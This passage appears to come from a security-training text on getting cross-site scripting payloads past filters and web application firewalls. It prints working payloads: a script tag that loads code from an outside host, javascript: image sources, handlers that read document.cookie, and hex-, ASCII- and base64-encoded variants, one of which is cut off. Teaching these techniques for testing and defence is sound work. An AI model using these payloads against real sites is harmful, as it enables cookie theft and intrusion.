Numerous techniques can be used to evade XSS protections and security products such as web application firewalls (WAFs). Instead of listing all the different evasion techniques outlined by OWASP, this section reviews some of the most popular techniques.

First, let’s take a look at an XSS JavaScript injection that would be detected by most XSS filters and security solutions:

```java
<SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>
```

he following example shows how the HTML **img** tag can be used in several ways to potentially evade XSS filters:

```java
<img src="javascript:alert('xss');">
<img src=javascript:alert('xss')>
<img src=javascript:alert(&quot;XSS&quot;)>
<img src=javascript:alert('xss')>
```

It is also possible to use other malicious HTML tags (such as tags), as demonstrated here:

```java
<a onmouseover="alert(document.cookie)">This is a malicious link</a>
<a onmouseover=alert(document.cookie)>This is a malicious link</a>
```

An attacker may also use a combination of hexadecimal HTML character references to potentially evade XSS filters, as demonstrated here:

```java
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&
#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

US ASCII encoding may bypass many content filters and can also be used as an evasion technique, but it works only if the system transmits in US ASCII encoding or if it is manually set. This technique is useful against WAFs. The following example demonstrates the use of US ASCII encoding to evade WAFs:

```java
¼script¾alert(¢XSS¢)¼/script¾
```

he following example shows an example of an evasion technique that involves using the HTML **embed** tags to embed a Scalable Vector Graphics (SVG) file:

```java
<EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm

AllowScriptAccess="always"></EMBED>
```

**TIP** The OWASP XSS Filter Evasion Cheat Sheet ([_https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet_](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)) includes dozens of additional examples of evasion techniques. You can access numerous XSS evasion technique vectors at my GitHub repository, at [_https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md_](https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md).
